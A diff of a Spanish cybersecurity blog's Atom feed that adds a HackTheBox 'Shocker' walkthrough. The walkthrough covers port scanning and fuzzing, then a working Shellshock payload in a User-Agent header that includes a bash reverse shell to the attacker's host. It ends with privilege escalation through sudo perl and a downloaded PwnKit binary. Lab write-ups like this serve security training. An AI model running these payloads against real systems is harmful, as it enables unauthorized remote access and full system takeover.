@@ -1,4 +1,251 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-28T12:45:43-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB Legacy</title><link href="http://localhost:4000/legacy/" rel="alternate" type="text/html" title="HTB Legacy" /><published>2022-08-17T00:00:00-05:00</published><updated>2022-08-17T00:00:00-05:00</updated><id>http://localhost:4000/legacy</id><content type="html" xml:base="http://localhost:4000/legacy/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-01T10:58:46-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB Shocker</title><link href="http://localhost:4000/shocker/" rel="alternate" type="text/html" title="HTB Shocker" /><published>2022-08-31T00:00:00-05:00</published><updated>2022-08-31T00:00:00-05:00</updated><id>http://localhost:4000/shocker</id><content type="html" xml:base="http://localhost:4000/shocker/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/shocker/02-tarjeta.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Hola!
+En esta ocasión vamos a resolver de la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shocker&lt;/code&gt; de &lt;a href=&quot;https://hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
+La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
+
+&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
+
+&lt;p&gt;Para iniciar nuestra máquina, vamos a crear con nuestra función &lt;a href=&quot;https://bast1ant1c.github.io/mkhack/&quot;&gt;mkhack&lt;/a&gt; un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shocker&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ mkhack shocker
+❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;recon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
+
+&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad &lt;a href=&quot;https://bast1ant1c.github.io/osping/&quot;&gt;osping&lt;/a&gt; detectando el tipo de sistema operativo basado en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttl&lt;/code&gt; &lt;em&gt;time to live&lt;/em&gt; de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ osping 10.10.10.56
+  
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Detectando sistema operativo ...
+  
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.56 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Identificamos que es una máquina &lt;strong&gt;Linux&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
+  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.56 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; ports | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
+  80/tcp   open  http
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ❯ nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,2222 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.10.56 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; versions                                                                                                                                                                              
+  PORT     STATE SERVICE VERSION
+  80/tcp   open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+  |_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  |_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
+  2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+  | ssh-hostkey: 
+  |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+  |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+  |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/shocker/03-page.png&quot; /&gt;       
+&lt;/p&gt;
+
+&lt;h2 id=&quot;fuzzing&quot;&gt;FUZZING&lt;/h2&gt;
+
+&lt;p&gt;Iniciamos con el reconocimiento de potenciales rutas de acceso web por el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;, por medio de múltiples peticiones y evidenciando el codigo de respuesta, verificamos que rutas son accesibles.&lt;/p&gt;
+
+&lt;p&gt;En esta ocasión usaremos la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirsearch&lt;/code&gt; con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f&lt;/code&gt; para poder generar peticiones hacia directorios, es decir, en terminaciones &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ❯ dirsearch &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; 404 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.56/
+  
+    _|. _ _  _  _  _ _|_    v0.4.2
+   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_||| _&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/_&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_|| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  
+  Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 24897
+  Target: http://10.10.10.56/
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;20:16:54] 403 -  294B  - /cgi-bin/
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;20:17:05] 200 -  137B  - /index.html
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;20:17:21] 403 -  299B  - /server-status
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Podemos ver en los resultados el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/&lt;/code&gt;, este directorio tiene como función la ejecución de scripts del servidor, suelen ser de extensiones &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pl&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cgi&lt;/code&gt;, entre otros. Por lo que realizamos la creación de un diccionario de extensiones para más adelante ejecutar un fuzzing avanzado.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  vim extensiones.txt
+  txt
+  sh
+  php
+  pl
+  cgi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora que creamos un diccionario con algunas extensiones potenciales, con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; agregamos dos diccionarios, esto es posibl por medio del parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w&lt;/code&gt;, podemos agregar la cantidad de diccionarios que deseemos, en esta ocasión solo requerimos de dos, adicionalmente, el comodín para realizar el fuzzing con esta utilidad es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FUZZ&lt;/code&gt;, sin embargo, para utilizar el otro diccionario, el siguiente comodín se denomina como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FUZ2Z&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   ❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; extensiones.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
+  &lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+  ID           Response   Lines    Word       Chars       Payload                                                                                              
+  &lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+  000000622:   200        7 L      18 W       119 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;user - sh&quot;&lt;/span&gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;shell-shock&quot;&gt;SHELL SHOCK&lt;/h2&gt;
+
+&lt;p&gt;¡Ya tenemos un script potencial!, ahora vamos a revisar cual es el contenido de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.56/cgi-bin/user.sh&quot;&lt;/span&gt;
+  Content-Type: text/plain
+  
+  Just an &lt;span class=&quot;nb&quot;&gt;uptime test &lt;/span&gt;script
+  
+   21:30:45 up 57 min,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.02, 0.03, 0.00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Efectivamente corresponde a un script que se está ejecutando en el servidor, por lo que ahora vamos con ayuda de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; y su script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http-shellshock&lt;/code&gt; detectar si es o no vulnerable a &lt;em&gt;shellshock&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.56 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-shellshock &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/cgi-bin/user.sh
+  PORT   STATE SERVICE
+  80/tcp open  http
+  | http-shellshock: 
+  |   VULNERABLE:
+  |   HTTP Shellshock vulnerability
+  |     State: VULNERABLE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Exploitable&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  |     IDs:  CVE:CVE-2014-6271
+  |       This web application might be affected by the vulnerability known
+  |       as Shellshock. It seems the server is executing commands injected
+  |       via malicious HTTP headers.
+  |             
+  |     Disclosure &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2014-09-24
+  |     References:
+  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2014-7169
+  |       http://www.openwall.com/lists/oss-security/2014/09/24/10
+  |       http://seclists.org/oss-sec/2014/q3/685
+  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2014-6271
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Nuestro objetivo es vulnerable! Así que es momento de explotar.&lt;/p&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACIÓN&lt;/h2&gt;
+
+&lt;p&gt;Básicamente la explotación de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell shock&lt;/code&gt; se da en la modificación del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Agent&lt;/code&gt; al momento de enviar una petición web, esta cabecera se envía de la siguiente manera &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Agent: () { :; };echo;echo; &amp;lt;COMMAND&amp;gt;&lt;/code&gt;, siendo &lt;command /&gt; el comando que deseamos ejecutar remotamente.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   ❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.56/cgi-bin/user.sh&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: () { :; };echo;echo; /usr/bin/whoami&quot;&lt;/span&gt;
+  
+  shelly
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez podemos evidenciar que tenemos ejecución remota de comandos, procedemos a entablar una reverse shell por medio de un oneliner de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.56/cgi-bin/user.sh&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: () { :; };echo;echo; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.4/4564 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos ponemos en escucha por el puerto de la reverse shell y tenemos acceso con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shelly&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
+  listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4564 ...
+  connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.56] 50738
+  bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+  shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+  whoami
+  &lt;/span&gt;shelly
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/shocker/04-intrusion.png&quot; /&gt;       
+&lt;/p&gt;
+
+&lt;p&gt;¡Es momento de leer la flag del usuario!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; user.txt 2&amp;gt;/dev/null
+  /home/shelly/user.txt
+  shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10 /home/shelly/user.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
+  &lt;/span&gt;2ec24e1132
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios-sudo&quot;&gt;ESCALADA DE PRIVILEGIOS SUDO&lt;/h2&gt;
+
+&lt;p&gt;Una vez tenemos acceso a la maquina vamos a realizar el escalamiento de permisos para poder obtener acceso privilegiado y control absoluto, en esta ocasión vamos a verificar los permisos de ejecución de comandos con sudo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+  Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;shelly on Shocker:
+      env_reset, mail_badpass,
+      &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+  
+  User shelly may run the following commands on Shocker:
+      &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/perl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Podemos ejecutar el comando perl con permisos de sudo sin necesidad de tener una contraseña, por lo que vamos a hacer uso del recurso de &lt;a href=&quot;https://gtfobins.github.io/gtfobins/perl/#shell&quot;&gt;GTFObins&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/sh&quot;;'&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
+  root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios-por-pwnkit&quot;&gt;ESCALADA DE PRIVILEGIOS POR PWNKIT&lt;/h2&gt;
+
+&lt;p&gt;Ahora vamos a realizar el escalamiento de privilegios revisando los permisos en la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
+  /usr/bin/pkexec
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Utilizamos el script de &lt;a href=&quot;https://github.com/ly4k/PwnKit&quot;&gt;ly4k&lt;/a&gt; de sus repositorios en &lt;a href=&quot;https://github.com/ly4k&quot;&gt;github&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../exploit
+  ❯ curl &lt;span class=&quot;nt&quot;&gt;-fsSL&lt;/span&gt; https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; PwnKit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de tener descargado el recurso, creamos un servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; con ayuda de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En la máquina victima por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt;, realizamos la descarga del contenido compartido anteriormente.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
+  shelly@Shocker:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.14.4/PwnKit                             
+  &lt;span class=&quot;nt&quot;&gt;--2022-07-20&lt;/span&gt; 23:58:12--  http://10.10.14.4/PwnKit
+  Connecting to 10.10.14.4:80... connected.s://raw.githubusercontent.com/ly4k/PwnK 
+  HTTP request sent, awaiting response... 200 OK
+  Length: 18040 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;18K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/octet-stream]
+  Saving to: &lt;span class=&quot;s1&quot;&gt;'PwnKit'&lt;/span&gt;
+  
+  PwnKit              100%[&lt;span class=&quot;o&quot;&gt;===================&amp;gt;]&lt;/span&gt;  17.62K  79.0KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.2s    
+  
+  2022-07-20 23:58:12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;79.0 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - &lt;span class=&quot;s1&quot;&gt;'PwnKit'&lt;/span&gt; saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;18040/18040]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora solo debemos dar permisos de ejecución al binario y ejecutarlo para tener un usuario con privilegios elevados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  shelly@Shocker:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x PwnKit 
+  shelly@Shocker:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./PwnKit 
+  root@Shocker:/tmp# &lt;span class=&quot;nb&quot;&gt;whoami
+  &lt;/span&gt;root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya no queda más que leer la flag de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;c&quot;&gt;# find / -name root.txt &lt;/span&gt;
+  /root/root.txt
+  &lt;span class=&quot;c&quot;&gt;# head -c 10 /root/root.txt; echo&lt;/span&gt;
+  52c2715605
